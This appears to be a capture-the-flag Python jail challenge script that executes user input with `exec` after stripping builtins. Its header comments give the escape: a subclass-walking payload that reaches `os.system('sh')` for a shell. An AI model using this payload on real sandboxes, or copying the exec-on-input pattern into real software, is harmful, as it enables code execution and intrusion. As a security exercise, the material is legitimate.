#!/usr/bin/python -u
# task5.py
# A real challenge for those python masters out there :)


#b = ().__class__.__base__.__subclasses__()[59]()
#
#a = [
#            c for c in ().__class__.__base__.__subclasses__()  
#                if c.__name__ == 'catch_warnings'
#                ][0]
#
# for c in "().__class__.__base__.__subclasses__()[53].__init__.func_globals['linecache'].__dict__['os'].system('sh')":
#   print "__builtins__['x'] = __builtins__['x'] + " + '"' + c + '"'

# None; exec __builtins__['x']
# ref : http://hacktracking.blogspot.com/2014/02/picoctf-2k13-python-eval-5.html

#print {}.__class__.__base__.__subclasses__()[59]()._module.__builtins__

from sys import modules
modules.clear()
del modules

_raw_input = raw_input
_BaseException = BaseException
_EOFError = EOFError

__builtins__.__dict__.clear()
__builtins__ = None

print 'Get a shell, if you can...'

while 1:
  try:
    d = {'x':None}
    exec 'x='+_raw_input()[:50] in d
    print 'Return Value:', d['x']
  except _EOFError, e:
    raise e
  except _BaseException, e:
    print 'Exception:', e
